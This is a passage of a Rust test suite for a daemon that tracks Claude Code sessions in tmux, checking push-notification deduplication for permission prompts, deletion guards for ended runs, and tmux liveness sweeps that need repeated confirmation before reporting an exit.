            "01K1B3XQ8ZC0DE5FGH7JKMNPQS",
            "p-b",
            "echo b",
        )
        .await;

        tokio::time::sleep(Duration::from_millis(700)).await;
        let rings = capture.0.lock().unwrap();
        let counts: Vec<usize> = rings.iter().map(|(h, _)| h.blocked_sessions).collect();
        assert_eq!(
            counts,
            vec![2, 2],
            "the count is of the fleet when the doorbell rings, and by then both \
             runs were blocked: {rings:?}"
        );
    }

    /// **The notice must not eat the decision's key, and must not outlive it.**
    ///
    /// A `permission_prompt` can arrive before — or without — the
    /// `PermissionRequest` that makes a card. Taking the permission gate for
    /// that notice would consume the prompt's key, and the real request landing
    /// afterwards would be suppressed as a duplicate of a ring that never
    /// described a card: the reader would never be told about the decision.
    ///
    /// And the notice must not simply *join* it. Two dispatches survive their
    /// grace independently, and APNs stores one notification per device without
    /// saying which — so the reader could be left holding "waiting for your
    /// input" while an answerable card sat behind it. The decision supersedes
    /// the notice, and one ring goes out.
    #[tokio::test]
    async fn a_notice_that_arrives_before_its_card_does_not_silence_the_decision() {
        let (daemon, capture) = capture_daemon();
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "permission_prompt",
                    "message": "Claude needs your permission to use Bash",
                    "prompt_id": "p-late",
                    "cwd": "/tmp",
                }),
                wait: false,
            })
            .await;
        // The structured request for that same prompt, arriving afterwards.
        raise_prompt(&daemon, TEST_UID, "p-late", "echo hi").await;

        tokio::time::sleep(Duration::from_millis(700)).await;
        let rings = capture.0.lock().unwrap();
        let kinds: Vec<_> = rings.iter().map(|(h, _)| h.kind).collect();
        assert_eq!(
            kinds,
            vec![crate::apns::PushKind::Approval],
            "the decision supersedes the notice about it, and it is the one that rings: {rings:?}"
        );
    }

    /// **A prompt whose card is gone is not news.** The decision rang, it was
    /// answered, the card went with it — and a delayed or replayed notice about
    /// that same prompt would be a notification about something that no longer
    /// exists. Silence is the honest answer, and it is a different answer from
    /// the one a prompt nobody has heard of gets.
    #[tokio::test]
    async fn a_notice_for_a_decision_that_already_rang_is_silent() {
        let (daemon, capture) = capture_daemon();
        raise_prompt(&daemon, TEST_UID, "p-done", "echo hi").await;
        tokio::time::sleep(Duration::from_millis(700)).await;
        assert_eq!(capture.0.lock().unwrap().len(), 1, "the decision rang");

        // The card goes: answered at the Mac, superseded, whatever ended it.
        daemon.inner.lock().await.pending.clear();

        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "permission_prompt",
                    "message": "Claude needs your permission to use Bash",
                    "prompt_id": "p-done",
                    "cwd": "/tmp",
                }),
                wait: false,
            })
            .await;

        tokio::time::sleep(Duration::from_millis(700)).await;
        assert_eq!(
            capture.0.lock().unwrap().len(),
            1,
            "no second ring for a decision that is over"
        );
    }

    /// **`Approval` has to mean there is a card to answer.** A
    /// `permission_prompt` whose `PermissionRequest` never arrived is a notice
    /// that Claude Code is asking, with nothing in the decision list behind it —
    /// the phone even has a word for that state. Tagging it `Approval` would
    /// send a tap to an empty, unactionable list.
    #[tokio::test]
    async fn a_permission_notice_with_no_card_behind_it_does_not_ring_as_a_decision() {
        let (daemon, capture) = capture_daemon();
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "permission_prompt",
                    "message": "Claude needs your permission to use Bash",
                    "prompt_id": "orphan",
                    "cwd": "/tmp",
                }),
                wait: false,
            })
            .await;

        tokio::time::sleep(Duration::from_millis(700)).await;
        let rings = capture.0.lock().unwrap();
        assert_eq!(rings.len(), 1, "it still rings: {rings:?}");
        assert_eq!(
            rings[0].0.kind,
            crate::apns::PushKind::NeedsInput,
            "a human is waited on, but there is no card to open"
        );
    }

    /// A run deleted while a push waits out its dispatch grace must stay
    /// silent. Without the ticket check, the eviction emptied the delivery
    /// watermarks and the task then woke to an *empty* exclusion list — a
    /// ring, to every device, about a session that no longer exists.
    #[tokio::test]
    async fn a_push_in_flight_when_its_session_is_deleted_never_rings() {
        let (daemon, capture) = capture_daemon();

        // An adopted run — no supervisor, no pending — so the deletion below
        // is legal: the gate under test is the push's own ticket, not
        // delete's guards.
        daemon
            .handle_hook(HookPost {
                session_id: "claude:push-1".into(),
                session_uid: None,
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "agent_needs_input",
                    "message": "waiting",
                    "cwd": "/tmp",
                }),
                wait: false,
            })
            .await;
        let row = daemon.store.find_session("claude:push-1").unwrap().unwrap();
        let outcome = daemon
            .delete_exited_session(&row.session_uid)
            .await
            .expect("the delete call itself succeeds");
        assert!(
            matches!(outcome, protocol::ws::DeleteSessionResult::Deleted { .. }),
            "the premise is a *deleted* run: {outcome:?}"
        );
        tokio::time::sleep(Duration::from_millis(700)).await;

        let rings = capture.0.lock().unwrap();
        assert!(
            rings.is_empty(),
            "a deleted run has nothing to ring about: {rings:?}"
        );
    }

    /// **A push admitted for a run that is already gone never rings.**
    ///
    /// The ticket catches an eviction that lands *after* admission. It cannot
    /// catch one that lands just before: a hook already past `ensure_session`
    /// goes on to admit, and mints its ticket against the epoch the eviction
    /// had already bumped — so the ticket agrees with the world and the push
    /// looks perfectly valid. What settles it is asking, at the moment of
    /// ringing, whether the run is still there.
    #[tokio::test]
    async fn a_push_admitted_for_a_run_that_is_already_gone_never_rings() {
        let (daemon, capture) = capture_daemon();
        let hint = |uid: &str| PushHint {
            project_label: "Aion".into(),
            kind: crate::apns::PushKind::NeedsInput,
            blocked_sessions: 1,
            session_uid: uid.into(),
        };

        // Nothing has ever filed a row under this uid, which is the state a
        // deleted run leaves behind.
        let ticket = daemon
            .push_gate
            .admit_ambient(TEST_UID, crate::push_gate::Ambient::Waiting)
            .expect("a fresh run admits");
        daemon.dispatch_push(TEST_UID.into(), 1, hint(TEST_UID), ticket, true, None);
        tokio::time::sleep(Duration::from_millis(700)).await;
        assert!(
            capture.0.lock().unwrap().is_empty(),
            "a run that is not there has nothing to ring about"
        );

        // The control: the same push for a run that does exist does ring, so
        // the silence above is the check and not the harness.
        daemon
            .handle_hook(quiet_hook("agent_completed", "done"))
            .await;
        let row = daemon
            .store
            .find_session("cc-1")
            .unwrap()
            .expect("the hook filed a row");
        // Past that hook's own dispatch grace, so its ring is not counted here.
        tokio::time::sleep(Duration::from_millis(700)).await;
        capture.0.lock().unwrap().clear();
        let ticket = daemon
            .push_gate
            .admit_ambient(&row.session_uid, crate::push_gate::Ambient::Waiting)
            .expect("a new class is news");
        daemon.dispatch_push(
            row.session_uid.clone(),
            1,
            hint(&row.session_uid),
            ticket,
            true,
            None,
        );
        tokio::time::sleep(Duration::from_millis(700)).await;
        assert_eq!(
            capture.0.lock().unwrap().len(),
            1,
            "a run that is still there rings"
        );
    }

    /// One ring per decision, through the real permission path: the
    /// `permission_prompt` notification that trails every `PermissionRequest`
    /// shares its prompt, so the twin finds the key and stays silent; a
    /// replayed request is deduplicated; a genuinely new decision rings.
    #[tokio::test]
    async fn an_approval_rings_once_and_its_notification_twin_never_does() {
        let (daemon, capture) = capture_daemon();

        raise_prompt(&daemon, TEST_UID, "p-1", "echo one").await; // rings
                                                                  // Claude's own notification about the same prompt, moments later.
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "permission_prompt",
                    "message": "Claude needs your permission to use Bash",
                    "prompt_id": "p-1",
                    "cwd": "/tmp",
                }),
                wait: false,
            })
            .await; // the twin: silent
        raise_prompt(&daemon, TEST_UID, "p-1", "echo one").await; // replay: silent
                                                                  // Past the first ring's dispatch grace, so this is a second decision
                                                                  // announced in its own right rather than one that supersedes a card
                                                                  // nobody was told about — which is the test below.
        tokio::time::sleep(Duration::from_millis(700)).await;
        raise_prompt(&daemon, TEST_UID, "p-2", "echo two").await; // new decision: rings

        tokio::time::sleep(Duration::from_millis(700)).await;
        let rings = capture.0.lock().unwrap();
        assert_eq!(rings.len(), 2, "two decisions, two rings: {rings:?}");
        assert!(
            rings
                .iter()
                .all(|(h, _)| h.kind == crate::apns::PushKind::Approval
                    && h.project_label == "tmp"),
            "an approval ring names the project and why it rang, nothing else: {rings:?}"
        );
    }

    /// **A decision superseded before its doorbell rang is not announced.**
    ///
    /// Claude asks one thing at a time, so a second prompt retires the first —
    /// and if that happens inside the dispatch grace, the first card is gone
    /// before anyone was told it existed. Ringing about it would send a reader
    /// to a decision list that does not hold it. The prompt that is actually
    /// waiting rings, once.
    #[tokio::test]
    async fn a_card_retired_before_its_doorbell_rang_does_not_ring() {
        let (daemon, capture) = capture_daemon();
        raise_prompt(&daemon, TEST_UID, "p-first", "echo one").await;
        raise_prompt(&daemon, TEST_UID, "p-second", "echo two").await;

        tokio::time::sleep(Duration::from_millis(700)).await;
        let rung = format!("{:?}", capture.0.lock().unwrap());
        let count = capture.0.lock().unwrap().len();
        assert_eq!(
            count, 1,
            "only the decision that is still open rings: {rung}"
        );
        assert!(
            daemon.has_pending_card(TEST_UID, "p-second").await,
            "and it is the one that survived"
        );
    }

    /// The per-device floor: a second test inside the window is refused with
    /// the wait, a different device is not, and the window expires.
    #[tokio::test]
    async fn the_test_push_gate_is_per_device_and_timed() {
        let daemon = test_daemon();
        assert_eq!(
            daemon.test_push_gate("dev-a").await,
            None,
            "first send passes"
        );
        let wait = daemon.test_push_gate("dev-a").await;
        assert!(
            wait.is_some_and(|s| (1..=30).contains(&s)),
            "second is floored: {wait:?}"
        );
        assert_eq!(
            daemon.test_push_gate("dev-b").await,
            None,
            "another device is unaffected"
        );

        // Expiry, proven rather than trusted: age the recorded send past the
        // floor by editing the record, not by sleeping 30 wall seconds.
        {
            let mut inner = daemon.inner.lock().await;
            let aged = std::time::Instant::now() - std::time::Duration::from_secs(31);
            inner.test_pushes.insert("dev-a".into(), aged);
        }
        assert_eq!(
            daemon.test_push_gate("dev-a").await,
            None,
            "a window that has passed refuses nobody"
        );
    }

    // ===================================================== deleting one run

    /// An adopted hook creates a row with no tmux location — the daemon cannot
    /// claim to know where a process it never launched lives — while a hosted
    /// recreation by exact uid keeps the location a crash left behind.
    #[tokio::test]
    async fn an_adopted_hook_records_no_location_and_a_hosted_recreation_keeps_its_own() {
        let daemon = test_daemon();
        daemon
            .handle_hook(HookPost {
                session_id: "claude:8f37b678".into(),
                session_uid: None,
                event: "SessionStart".into(),
                payload: json!({"hook_event_name": "SessionStart", "cwd": "/tmp"}),
                wait: false,
            })
            .await;
        let adopted = daemon
            .store
            .find_session("claude:8f37b678")
            .unwrap()
            .unwrap();
        assert_eq!(adopted.tmux_session, "");
        assert_eq!(adopted.tmux_socket, "");

        // Crash recovery: an exact-uid hook for a hosted name refabricates the
        // hosted location, which for a `cc-*` run is correct.
        daemon
            .handle_hook(HookPost {
                session_id: "cc-9".into(),
                session_uid: Some(TEST_UID.into()),
                event: "SessionStart".into(),
                payload: json!({"hook_event_name": "SessionStart", "cwd": "/tmp"}),
                wait: false,
            })
            .await;
        let hosted = daemon.store.get_session(TEST_UID).unwrap().unwrap();
        assert_eq!(hosted.tmux_session, "cc-9");
        assert_eq!(hosted.tmux_socket, protocol::TMUX_SOCKET_NAME);
    }

    /// The sweep only asks tmux about sessions that live in tmux. An unhosted
    /// row is not probed, not counted, and above all not "proven" dead by a
    /// server that has never heard of it.
    #[tokio::test]
    async fn the_sweep_leaves_an_unhosted_row_alone_and_uncounted() {
        let daemon = test_daemon();
        let unhosted = "01KYZ5E56X0D1RT7ZVRYK1ZEF7";
        let mut row = SessionRow {
            session_uid: unhosted.into(),
            session_id: "claude:conv".into(),
            tmux_session: String::new(),
            tmux_socket: String::new(),
            cwd: "/tmp".into(),
            claude_session_id: None,
            transcript_path: None,
            lifecycle: Lifecycle::Live,
            created_at: protocol::time::now_rfc3339(),
            updated_at: protocol::time::now_rfc3339(),
        };
        daemon.store.upsert_session(&row).unwrap().assert_present();
        row.session_uid = "01KYZ5E56X0D1RT7ZVRYK1ZEF8".into();
        row.session_id = "cc-1".into();
        row.tmux_session = "cc-1".into();
        row.tmux_socket = protocol::TMUX_SOCKET_NAME.into();
        daemon.store.upsert_session(&row).unwrap().assert_present();

        // Every probe answers "gone" — the answer that used to kill both rows.
        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
        let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

        assert_eq!(
            sweep.examined, 1,
            "the unhosted row must not even be counted"
        );
        assert_eq!(
            lifecycle_of(&daemon, unhosted),
            Lifecycle::Live,
            "no probe ran, so nothing may claim this run ended"
        );
        assert_eq!(
            lifecycle_of(&daemon, "01KYZ5E56X0D1RT7ZVRYK1ZEF8"),
            Lifecycle::Exited,
            "the hosted row is still reconciled exactly as before"
        );
    }

    /// The primary resurrection path, closed: an adopted run's hooks carry no
    /// uid, so a uid tombstone alone cannot stop the next hook minting a fresh
    /// identity and putting the row straight back. Removing an adopted run
    /// means "stop observing this conversation" — ordinary hooks are dropped —
    /// and a SessionStart, a resume announcing itself, is the one thing that
    /// clears the record and re-adopts.
    #[tokio::test]
    async fn a_deleted_adopted_run_stays_deleted_until_a_new_session_starts() {
        let daemon = test_daemon();
        let adopt = |event: &'static str| HookPost {
            session_id: "claude:conv-1".into(),
            session_uid: None,
            event: event.into(),
            payload: json!({"hook_event_name": event, "cwd": "/tmp"}),
            wait: false,
        };
        daemon.handle_hook(adopt("SessionStart")).await;
        let first = daemon.store.find_session("claude:conv-1").unwrap().unwrap();
        assert_eq!(
            daemon
                .delete_exited_session(&first.session_uid)
                .await
                .unwrap(),
            protocol::ws::DeleteSessionResult::Deleted { events: 1 }
        );

        // The very next ordinary hook — the one that used to resurrect.
        daemon.handle_hook(adopt("PostToolUse")).await;
        assert!(
            daemon
                .store
                .find_session("claude:conv-1")
                .unwrap()
                .is_none(),
            "an ordinary hook must not bring a removed conversation back"
        );

        // A new session start is a request to observe again.
        daemon.handle_hook(adopt("SessionStart")).await;
        let readopted = daemon.store.find_session("claude:conv-1").unwrap();
        assert!(readopted.is_some(), "a resume announcing itself re-adopts");
        assert_ne!(
            readopted.unwrap().session_uid,
            first.session_uid,
            "as a new run, never by resurrecting the deleted uid"
        );
    }

    /// Deleting a live unhosted run retires its transcript tail. The cursor
    /// died with the rows, so a tail left running would re-read the file from
    /// byte zero every poll, forever, into a guard that drops every batch.
    #[tokio::test]
    async fn deleting_an_unhosted_run_stops_its_tail() {
        let (daemon, mut tails) = daemon_watching_tails(shared_store(), Config::default());
        daemon
            .handle_hook(HookPost {
                session_id: "claude:conv-2".into(),
                session_uid: None,
                event: "SessionStart".into(),
                payload: json!({
                    "hook_event_name": "SessionStart", "cwd": "/tmp",
                    "transcript_path": "/tmp/conv-2.jsonl"
                }),
                wait: false,
            })
            .await;
        let row = daemon.store.find_session("claude:conv-2").unwrap().unwrap();
        assert!(matches!(
            tails.try_recv(),
            Ok(crate::tailer::TailCommand::Follow { .. })
        ));

        assert!(matches!(
            daemon
                .delete_exited_session(&row.session_uid)
                .await
                .unwrap(),
            protocol::ws::DeleteSessionResult::Deleted { .. }
        ));
        match tails.try_recv() {
            Ok(crate::tailer::TailCommand::Stop { session_uid }) => {
                assert_eq!(session_uid, row.session_uid)
            }
            other => panic!("the delete must stop the tail, got {other:?}"),
        }
    }

    /// The registration that raced a delete: the row is gone, the tombstone is
    /// not, and installing the supervisor anyway would leave the daemon holding
    /// live state for a session with no row.
    #[tokio::test]
    async fn a_registration_that_raced_a_deletion_is_refused() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        seed_session(&daemon, uid, "cc-1", Lifecycle::Exited);
        assert_eq!(
            daemon.delete_exited_session(uid).await.unwrap(),
            protocol::ws::DeleteSessionResult::Deleted { events: 0 }
        );

        let (tx, _rx) =
            mpsc::channel::<DaemonFrame>(protocol::config::Config::default().ipc_write_queue);
        let refused = daemon
            .register_supervisor(
                protocol::ipc::RegisterSession {
                    session_id: "cc-1".into(),
                    session_uid: Some(uid.into()),
                    tmux_session: "cc-1".into(),
                    tmux_socket: protocol::TMUX_SOCKET_NAME.into(),
                    cwd: "/tmp".into(),
                    supervisor_pid: 4242,
                    claude_bin: None,
                    started_at: protocol::time::now_rfc3339(),
                    protocol_minor: protocol::PROTOCOL_MINOR,
                },
                tx,
                Arc::new(std::sync::Mutex::new(HashMap::new())),
            )
            .await;
        assert!(
            refused.is_err(),
            "a registration for a deleted uid must be refused"
        );
        let inner = daemon.inner.lock().await;
        assert!(
            !inner.supervisors.contains_key(uid),
            "no ghost supervisor for a deleted run"
        );
        assert!(
            daemon.store.get_session(uid).unwrap().is_none(),
            "and no resurrected row"
        );
    }

    /// The guard the store cannot hold, and the reason it is here.
    ///
    /// `mark_exited` writes the lifecycle and stops the tail; it does not retire
    /// `inner.pending`. So an approval raised before the run ended is still in
    /// this process afterwards, while the row it belongs to reads `Exited` and
    /// the phone will happily offer a swipe on it. Delete the rows underneath
    /// that approval and whatever resolves it later writes events for a session
    /// that no longer exists — there is no foreign key to stop it.
    ///
    /// `prune_ended_sessions` has refused exactly this since it was written. A
    /// swipe must not be the way around it.
    ///
    /// **The supervisor is detached first, and that is what makes this a test.**
    /// The guard is `supervisors || pending`, and `attach` leaves a supervisor
    /// registered — `Registration` has no `Drop`, so letting the handle fall out
    /// of scope detaches nothing. With one attached, the first clause
    /// short-circuits and the second is never evaluated: deleting the `pending`
    /// clause outright left this test green, which was measured, not supposed.
    /// Detaching leaves the open approval as the only thing that can refuse.
    ///
    /// It is also the shape the real case has. A supervisor that is still
    /// attached keeps its run out of `Exited` anyway; the run that reaches this
    /// guard is one whose supervisor is gone and whose approval outlived it.
    #[tokio::test]
    async fn an_ended_run_with_an_approval_still_open_is_not_deletable() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &request_id).await);

        daemon.mark_exited(&test_key(), Some(0), Some("test")).await;
        daemon.unregister_supervisor(&pane._registration).await;
        assert_eq!(lifecycle_of(&daemon, uid), Lifecycle::Exited);
        {
            let inner = daemon.inner.lock().await;
            assert!(
                !inner.supervisors.contains_key(uid),
                "the premise: no supervisor, so only the approval can refuse this"
            );
            assert_eq!(
                inner.pending.len(),
                1,
                "the premise: ending a run does not retire its open approval"
            );
        }

        assert_eq!(
            daemon.delete_exited_session(uid).await.unwrap(),
            protocol::ws::DeleteSessionResult::StillRunning,
            "the daemon still holds live state for it, whatever the column says"
        );
        assert!(
            daemon.store.get_session(uid).unwrap().is_some(),
            "and the row is still there to be held"
        );
    }

    /// The other half of the same guard, isolated the same way: a supervisor
    /// attached and no approval open. Without this, deleting the `supervisors`
    /// clause would go unnoticed.
    #[tokio::test]
    async fn an_ended_run_with_a_supervisor_still_attached_is_not_deletable() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let _pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
        daemon.mark_exited(&test_key(), Some(0), Some("test")).await;
        {
            let inner = daemon.inner.lock().await;
            assert!(inner.supervisors.contains_key(uid));
            assert!(
                inner.pending.is_empty(),
                "the premise: nothing pending, so only the supervisor can refuse this"
            );
        }

        assert_eq!(
            daemon.delete_exited_session(uid).await.unwrap(),
            protocol::ws::DeleteSessionResult::StillRunning
        );
        assert!(daemon.store.get_session(uid).unwrap().is_some());
    }

    /// The control for the test above: nothing held, so it goes.
    #[tokio::test]
    async fn an_ended_run_nobody_is_holding_is_deletable() {
        let daemon = test_daemon();
        let uid = "01KYZ5E56X0D1RT7ZVRYK1ZEF9";
        seed_session(&daemon, uid, "cc-9", Lifecycle::Exited);

        assert_eq!(
            daemon.delete_exited_session(uid).await.unwrap(),
            protocol::ws::DeleteSessionResult::Deleted { events: 0 }
        );
        assert!(daemon.store.get_session(uid).unwrap().is_none());
    }

    #[tokio::test]
    async fn a_run_whose_name_was_taken_by_a_newer_run_is_marked_exited() {
        // **The second phantom, and the reason `session_uid` exists.** Found on
        // the owner's machine after the first was fixed:
        //
        //   cc-1  01KYZ5E56X…  live  detached   /private/tmp/cc-tfpush   <- dead
        //   cc-1  01KYZ6CRZA…  live  attached   /private/tmp/cc-fw       <- the real one
        //   tmux: cc-1: 1 windows
        //   liveness: 2 session(s) checked over 1 tmux name(s): 2 running
        //
        // Reproduced deterministically: a session killed and its name reclaimed
        // 452ms later left the dead run reading `live` for as long as the name was
        // held. `has-session` proves *some* session owns `cc-1` — never that every
        // row recording `cc-1` is alive — and one `Present` was being spent on all
        // of them.
        let daemon = test_daemon();
        let dead = "01KYZ5E56X0D1RT7ZVRYK1ZEF9";
        let holder = "01KYZ6CRZAVTAJS15640KT0QJW";
        seed_session(&daemon, dead, "cc-1", Lifecycle::Live);
        seed_session(&daemon, holder, "cc-1", Lifecycle::Live);

        // One name, present, held by the newer run — exactly what tmux reports.
        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Present)
            .held_by("cc-1", holder);
        let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

        assert_eq!(
            lifecycle_of(&daemon, dead),
            Lifecycle::Exited,
            "a run whose name is held by somebody else is not running"
        );
        assert_eq!(
            lifecycle_of(&daemon, holder),
            Lifecycle::Live,
            "and the run that actually holds it must be left alone"
        );
        assert_eq!((sweep.present, sweep.unknown), (1, 0));
        // The exit is reported through the log, like any other, so a phone learns
        // about it rather than finding a row changed underneath it.
        assert!(kinds_of(&daemon, dead).contains(&EventKind::SessionEnd));
        assert!(!kinds_of(&daemon, holder).contains(&EventKind::SessionEnd));
    }

    #[tokio::test]
    async fn a_session_that_predates_the_stamp_is_never_called_dead() {
        // The compatibility case, and the one that could turn this fix into a
        // worse bug than it repairs. A session created before the daemon started
        // asking has no `CODECONNECT_SESSION_UID`, so tmux answers "unknown
        // variable" — the session is *there*, it simply cannot say whose it is.
        // Read as an absence that would mark a running agent dead.
        let daemon = test_daemon();
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);

        // No `held_by`: the fake answers `Present` with no identity, which is what
        // an unstamped session produces.
        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Present);
        let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

        assert_eq!(lifecycle_of(&daemon, TEST_UID), Lifecycle::Live);
        assert_eq!(sweep.present, 1);
        assert!(!kinds_of(&daemon, TEST_UID).contains(&EventKind::SessionEnd));
    }

    #[tokio::test]
    async fn a_live_session_whose_tmux_session_is_gone_is_marked_exited_by_a_sweep() {
        // **The regression test.** Found on the owner's machine: 45 sessions,
        // 26 of them reported `live`, and `tmux -L codeconnect ls` saying "no
        // server running" — so every one of those 26 was dead and the fleet was
        // confidently reporting otherwise. The cause was that `session_exited`
        // was the *only* thing that could ever write `Exited`, and it runs only
        // when a supervisor reports an exit. A daemon that was down at the
        // moment of death, a supervisor that was killed, a Mac that slept: in
        // every one of those the row stayed `live` for ever, because nothing
        // ever looked.
        let daemon = test_daemon();
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);
        assert_eq!(lifecycle_of(&daemon, TEST_UID), Lifecycle::Live);

        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
        let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

        assert_eq!(
            lifecycle_of(&daemon, TEST_UID),
            Lifecycle::Exited,
            "a session tmux says is not there must not keep reporting as running"
        );
        assert_eq!(sweep.examined, 1);
        assert_eq!(sweep.gone, 1);
        assert_eq!(sweep.unknown, 0);
        assert_eq!(sweep.unconfirmed, 0);
    }

    #[tokio::test]
    async fn a_session_whose_presence_cannot_be_determined_is_left_exactly_as_it_was() {
        // The other half, and the one that matters more: silently marking a
        // live session dead is the same class of lie as the bug being fixed,
        // told in the opposite direction. tmux missing, a socket that cannot be
        // addressed, a message we do not recognise, a child that timed out —
        // none of those is evidence that an agent exited, and `unknown` is a
        // state the product supports precisely so this can decline to guess.
        let daemon = test_daemon();
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);
        let other = "01K1B3XZZZC0DE5FGH7JKMNPQR";
        seed_session(&daemon, other, "cc-2", Lifecycle::Unknown);

        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Unknown(
            "too many open files".into(),
        ));
        let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

        assert_eq!(lifecycle_of(&daemon, TEST_UID), Lifecycle::Live);
        assert_eq!(
            lifecycle_of(&daemon, other),
            Lifecycle::Unknown,
            "an unknown session stays unknown; it is not evidence of an exit either"
        );
        assert_eq!(sweep.unknown, 2);
        assert_eq!(sweep.gone, 0);
        // And nothing was written to the log at all: a sweep that established
        // nothing must leave no trace of a fact it did not observe.
        assert!(kinds_of(&daemon, TEST_UID).is_empty());
        assert!(kinds_of(&daemon, other).is_empty());
    }

    #[tokio::test]
    async fn one_look_is_never_enough_to_report_a_death() {
        // The supervisor's rule, reused rather than reinvented: a reported exit
        // is durable and cannot be withdrawn, so it takes
        // `EXIT_CONFIRMATIONS` looks. A tmux server restarting between the
        // sweep and its answer, or a probe that raced a server's startup,
        // produces exactly one `Gone` for a session that is running.
        const _: () = assert!(protocol::tmux::EXIT_CONFIRMATIONS >= 2);

        for second_look in [
            protocol::tmux::SessionPresence::Present,
            protocol::tmux::SessionPresence::Unknown("lost server".into()),
        ] {
            let daemon = test_daemon();
            seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);
            let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone).then(
                "cc-1",
                vec![protocol::tmux::SessionPresence::Gone, second_look.clone()],
            );

            let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

            assert_eq!(
                lifecycle_of(&daemon, TEST_UID),
                Lifecycle::Live,
                "one `Gone` followed by {second_look:?} is not proof of an exit"
            );
            assert_eq!(sweep.gone, 0);
            assert_eq!(sweep.unconfirmed, 1);
            assert_eq!(
                tmux.asked().len(),
                protocol::tmux::EXIT_CONFIRMATIONS as usize,
                "the sweep must actually take a second look"
            );
        }
    }

    #[tokio::test]
    async fn a_session_that_is_really_running_is_left_alone() {
        let daemon = test_daemon();
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);
        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Present);
        let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;
        assert_eq!(lifecycle_of(&daemon, TEST_UID), Lifecycle::Live);
        assert_eq!(sweep.present, 1);
        assert_eq!(sweep.gone, 0);
        assert!(kinds_of(&daemon, TEST_UID).is_empty());
        // One look is all a running session costs — the confirmations exist to
        // make an *exit* expensive, not to re-ask about a healthy fleet.
        assert_eq!(tmux.asked(), vec!["cc-1".to_string()]);
    }

    #[tokio::test]
    async fn the_phone_learns_through_the_event_log_and_not_by_the_row_changing_under_it() {
        // The rule the whole daemon is built on: the log is how a client finds
        // out. A sweep that silently rewrote `lifecycle` would leave a phone
        // holding a session card that says "Running" until something unrelated
        // made it re-list the fleet — and there would be nothing in the
        // timeline saying the agent had ended.
        let daemon = test_daemon();
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);
        let mut events = daemon.events_tx.subscribe();

        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
        daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

        let event = events.try_recv().expect("the end must be broadcast");
        assert_eq!(event.kind, EventKind::SessionEnd);
        assert_eq!(event.session_uid, TEST_UID);
        assert_eq!(event.seq, 1);
        // The same envelope a reported exit produces, so no client needs to
        // learn a new shape — and `exit_code: null` because nobody watched this
        // run end. Inventing a 0 would claim it finished cleanly.
        assert!(event.payload.get("exit_code").is_some_and(|c| c.is_null()));
        // …with the one addition that keeps the log honest about *how* the end
        // was established.
        let reason = event.payload["reason"].as_str().unwrap_or_default();
        assert!(reason.contains("tmux"), "{reason}");
        assert!(kinds_of(&daemon, TEST_UID).contains(&EventKind::SessionEnd));
    }

    #[tokio::test]
    async fn a_session_already_known_to_have_ended_is_never_asked_about_again() {
        // Both a cost argument and a correctness one. A machine accumulates
        // ended sessions for ever, and re-probing them would make every sweep
        // slower than the last; re-marking them would append a second
        // `SessionEnd` to a run that has already ended once.
        let daemon = test_daemon();
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Exited);
        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
        let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;
        assert_eq!(sweep.examined, 0);
        assert_eq!(sweep.targets, 0);
        assert!(tmux.asked().is_empty(), "{:?}", tmux.asked());
        assert!(kinds_of(&daemon, TEST_UID).is_empty());
    }

    #[tokio::test]
    async fn one_question_settles_every_row_that_shares_a_tmux_name() {
        // The bound. Presence is a property of the tmux *server*, not of a
        // database row, so six dead runs that all reused the name `cc-1` are
        // one question — which is what keeps a sweep proportional to the number
        // of distinct names rather than to a machine's whole history.
        let daemon = test_daemon();
        let uids: Vec<String> = (0..6)
            .map(|i| format!("01K1B3XQ8ZC0DE5FGH7JKMNP{i:02}"))
            .collect();
        for uid in &uids {
            assert!(protocol::uid::is_well_formed(uid));
            seed_session(&daemon, uid, "cc-1", Lifecycle::Live);
        }

        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
